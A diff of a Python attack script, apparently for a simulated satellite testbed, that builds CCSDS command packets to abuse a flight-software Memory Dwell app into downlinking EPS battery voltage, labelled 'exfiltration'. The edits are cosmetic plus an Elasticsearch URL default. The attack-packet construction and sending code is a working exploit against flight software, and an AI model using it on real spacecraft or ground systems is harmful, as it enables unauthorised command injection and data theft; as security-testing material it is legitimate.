@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-attack_md_jam.py — Scenario 2 Phase B: MD Dwell JAM for EPS exfiltration
+attack_md_jam.py - Scenario 2 Phase B: MD Dwell JAM for EPS exfiltration
 
 Uses MD app's JAM_DWELL and START_DWELL commands to redirect Dwell Table 2,
 Entry 1 to read GENERIC_EPS_AppData.HkTelemetryPkt.DeviceHK.BatteryVoltage
 (uint16 at estimated offset 0x24 within GENERIC_EPS_AppData). The MD app
-then downlinks the battery voltage in dwell telemetry packets — no memory
+then downlinks the battery voltage in dwell telemetry packets - no memory
 corruption required. This exploits MD's intended design for arbitrary memory
 reads.
 
@@ -36,16 +36,21 @@ References:
     MD_START_DWELL_CC   = 2       (default_md_fcncode_values.h)
     MD_CmdJam_Payload_t           (default_md_msgdefs.h)
     MD_CmdStartStop_Payload_t     (default_md_msgdefs.h)
-    F8 overflow context           (.ai-memory/tasks/test_plans.md Scenario 2)
+    F8 overflow context           (see test plans referenced in debug/FOLLOWUPS.md, Scenario 2)
 """
 
 import argparse
 import json
+import os
 import socket
 import struct
 import time
 import urllib.error
 import urllib.request
+
+DEFAULT_ES_URL = os.environ.get(
+    "ES_URL", f"http://localhost:{os.environ.get('ES_PORT', '9200')}"
+)
 
 # ---------------------------------------------------------------------------
 # CCSDS constants
@@ -91,13 +96,13 @@ def build_jam_cmd(table_id: int, entry_id: int,
     Build a MD_JAM_DWELL_CC CCSDS command packet.
 
     MD_CmdJam_Payload_t layout (little-endian on amd64):
-        TableId     (uint16)  — 1-based table index
-        EntryId     (uint16)  — 1-based entry index
-        FieldLength (uint16)  — bytes to read: 1, 2, or 4
-        DwellDelay  (uint16)  — wakeup ticks before next dwell
-        Offset      (uint64)  — cpuaddr = absolute addr when SymName is empty,
+        TableId     (uint16)  - 1-based table index
+        EntryId     (uint16)  - 1-based entry index
+        FieldLength (uint16)  - bytes to read: 1, 2, or 4
+        DwellDelay  (uint16)  - wakeup ticks before next dwell
+        Offset      (uint64)  - cpuaddr = absolute addr when SymName is empty,
                                 OR byte offset within symbol when SymName set
-        SymName     (char[64])— null-terminated symbol name (zero-padded)
+        SymName     (char[64])- null-terminated symbol name (zero-padded)
     Total payload = 2+2+2+2+8+64 = 80 bytes
     data_len field = (2 secondary + 80 payload) - 1 = 81
     """
@@ -121,8 +126,8 @@ def build_start_dwell_cmd(table_mask: int, seq: int = 0xC001) -> bytes:
     Build a MD_START_DWELL_CC CCSDS command packet.
 
     MD_CmdStartStop_Payload_t layout (little-endian):
-        TableMask (uint16) — bitmask: bit0=TBL1, bit1=TBL2, ...
-        Padding   (uint16) — zero
+        TableMask (uint16) - bitmask: bit0=TBL1, bit1=TBL2, ...
+        Padding   (uint16) - zero
     Total payload = 4 bytes
     data_len field = (2 secondary + 4 payload) - 1 = 5
     """
@@ -190,8 +195,9 @@ def main() -> None:
                         help="MD dwell table to reconfigure (default: 2)")
     parser.add_argument("--entry-id",   type=int, default=1,
                         help="Dwell entry index to JAM, 1-based (default: 1)")
-    parser.add_argument("--kibana-url", default="http://localhost:9200",
-                        help="Elasticsearch base URL (default: http://localhost:9200)")
+    parser.add_argument("--kibana-url", default=DEFAULT_ES_URL,
+                        help=f"Elasticsearch base URL (default: {DEFAULT_ES_URL}; "
+                             f"override via ES_URL or ES_PORT env vars)")
     parser.add_argument("--no-confirm", action="store_true",
                         help="Skip Kibana dwell packet confirmation poll")
     args = parser.parse_args()
@@ -199,7 +205,7 @@ def main() -> None:
     # Table mask bit: table 1 → bit 0 (0x0001), table 2 → bit 1 (0x0002), etc.
     table_mask = 1 << (args.table_id - 1)
 
-    print(f"[*] MD JAM attack — Scenario 2 Phase B: EPS BatteryVoltage exfiltration")
+    print(f"[*] MD JAM attack - Scenario 2 Phase B: EPS BatteryVoltage exfiltration")
     print(f"[*] Target:     {args.host}:{args.port}")
     print(f"[*] MD Table:   {args.table_id}, Entry: {args.entry_id}")
     print(f"[*] Symbol:     {EPS_SYMBOL_NAME} + offset 0x{args.offset:02X}")
@@ -223,7 +229,8 @@ def main() -> None:
         time.sleep(0.1)
 
         sock.sendto(start_pkt, (args.host, args.port))
-        print(f"[+] MD_START_DWELL_CC sent ({len(start_pkt)} bytes, TableMask=0x{table_mask:04X})")
+        print(f"[+] MD_START_DWELL_CC sent ({len(start_pkt)} bytes, "
+              f"TableMask=0x{table_mask:04X})")
     finally:
         sock.close()
 
@@ -234,7 +241,7 @@ def main() -> None:
     print()
     print("[*] Verify with Kibana:")
     print(f"    GET {args.kibana_url}/nos3-telemetry-*/_search")
-    print('    Filter: msg_name wildcard "*DWELL*"  — look for MD dwell telemetry events')
+    print('    Filter: msg_name wildcard "*DWELL*"  - look for MD dwell telemetry events')
     print()
     print("[*] Cross-check: compare Data[0..1] against EPS HK BatteryVoltage field")
     print("    (EPS HK MID = 0x091A, BatteryVoltage at byte offset 16 of HK packet)")
